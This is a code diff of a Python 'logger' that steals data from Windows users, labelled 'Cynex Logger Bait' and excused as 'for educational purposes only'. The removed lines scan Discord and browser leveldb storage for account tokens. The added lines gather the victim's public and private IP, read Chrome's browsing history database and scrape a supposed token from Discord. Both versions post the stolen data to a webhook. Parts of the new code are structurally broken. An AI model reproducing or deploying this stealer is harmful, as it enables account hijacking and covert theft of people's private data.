@@ -1,72 +1,103 @@
 import os
 import re
 import json
+import requests
 from urllib.request import Request, urlopen
-import base64
+# Sql
+import sqlite3
 
-wh_url = base64.b64decode('').decode()  # insert your webhook encoded in base64
 
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+# this is for educational purposes only
 
-    tokens = []
+wh_url = "" # Too lazy
+ip_url = "https://ipinfo.io/json"
+base_url = "https://discord.com/channels/@me"
 
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
 
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
 
 
 def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+  
 
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',  # Added comma here
-        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\'
-    }
 
-    message = '@everyone'
+  # Call to the fuckin ip info url shit
+  global ip_url
+  req = Request(ip_url, headers={'User-Agent': 'Mozilla/5.0'})
+  ipinfo = urlopen(req).read()
+  ipinfo = json.loads(ipinfo)
+  public_ip = ipinfo['ip']
+  # Get private ip
+  import socket
 
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
+  def get_private_ip():
+      private_ip = socket.gethostbyname(socket.gethostname())
+      return private_ip
 
-        message += f'\n**{platform}**\n```\n'
+  private_ip = get_private_ip()
 
-        tokens = find_tokens(path)
 
-        if len(tokens) > 0:
-            for token in tokens:
-                message += f'{token}\n'
-        else:
-            message += 'No tokens found.\n'
 
-        message += '```'
+  
+  # wait to see if tokens are found
 
-    headers = {
-        'Content-Type': 'application/json'
-    }
+  tokens=[]
+  token=""
+  
 
-    payload = json.dumps({'content': message})
+
+  try:
+
+
+
+        
+
+
 
     try:
-        req = Request(wh_url, data=payload.encode(), headers=headers)
-        urlopen(req)
+            full_path = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome\\User Data\\Default\\" + "History"
+            # Open with SQLite
+            conn = sqlite3.connect(full_path)
+            cursor = conn.cursor()
+            # Print all tables in the database to figure out the table name as for its not urls
+            # cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+            # Get links
+            links = []
+            for row in cursor.execute("SELECT url FROM urls"):
+                links.append(row[0])
     except:
         pass
+
+    # Get token 
+
+    # Request base url
+    response="      "
+
+    req = Request(base_url, headers={'User-Agent': 'Mozilla/5.0'})
+    response = str(urlopen(req).read())
+    response=response.replace("_0xj.nonce = \\\'","BLINKER|||")
+    response=response.split("BLINKER|||")
+    response=response[1]
+    response=response.replace("\\';_0xj","|||BLINKER")
+    response=response.split("|||BLINKER")
+    response=response[0]
+    token=response
+    #print(token)
+
+    
+  except Exception as e:
+    print(e)
+    pass
+  
+  embed={
+    "username": "Cynex Logger Bait",
+    "content": f"**Public IP:** {public_ip} \n**Private IP:** {private_ip}  \n**Tokens:** {token} \n **Search History**: ```{links}```"
+  }
+
+  # Send via requests and webhook url
+  requests.post(wh_url, data=embed)
+
+
 
 
 if __name__ == '__main__':
